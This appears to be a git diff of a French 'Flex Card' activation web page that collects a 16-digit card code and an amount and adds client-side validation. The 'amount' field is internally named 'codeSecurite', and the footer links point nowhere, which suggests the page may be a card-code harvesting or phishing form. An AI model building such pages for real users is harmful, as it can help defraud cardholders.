@@ -1,37 +1,51 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Activation de carte</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-  <link rel="icon" type="image/png" href="logo.png">
 </head>
 <body>
-  <div class="main-container">
-    <img src="logo.png" alt="Flex Card" class="logo fade-in">
-    <p class="fade-in delay">Bienvenue</p>
-    <p class="fade-in delay-2">Pour activer votre carte, entrez le code de la carte et le montant.</p>
-
-    <form action="/envoyer-code" method="POST" class="fade-in delay-2">
-      <label>Code de la carte</label><br>
-      <input type="text" name="numeroCarte" required><br><br>
-
-      <label>Montant</label><br>
-      <input type="text" name="codeSecurite" required><br><br>
-
-      <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div><br>
-
+  <div class="container">
+    <img src="logo.png" alt="Logo Flex Card" class="logo" />
+    <h2>Bienvenue</h2>
+    <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>
+    <form action="/envoyer-code" method="POST">
+      <input type="text" id="numeroCarte" name="numeroCarte" placeholder="Code de la carte" maxlength="16" required />
+      <input type="text" id="codeSecurite" name="codeSecurite" placeholder="Montant" required />
+      <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div>
       <button type="submit">Activer ma carte</button>
     </form>
-
-    <footer class="footer">
-      <nav>
-        <a href="/">Accueil</a>
-        <a href="a-propos.html">À propos</a>
-        <a href="confidentialite.html">Politique de confidentialité</a>
-      </nav>
-    </footer>
   </div>
+  <footer>
+    <a href="#">Accueil</a>
+    <a href="#">À propos</a>
+    <a href="#">Politique de confidentialité</a>
+  </footer>
+
+  <script>
+    const form = document.querySelector('form');
+    const codeInput = document.getElementById('numeroCarte');
+    const montantInput = document.getElementById('codeSecurite');
+
+    form.addEventListener('submit', function (e) {
+      const code = codeInput.value.trim();
+      const montant = montantInput.value.trim();
+
+      if (!/^\d{16}$/.test(code)) {
+        alert("Le code de la carte doit contenir exactement 16 chiffres.");
+        e.preventDefault();
+        return;
+      }
+
+      if (!/^\d+$/.test(montant)) {
+        alert("Le montant doit être un nombre uniquement.");
+        e.preventDefault();
+        return;
+      }
+    });
+  </script>
 </body>
 </html>
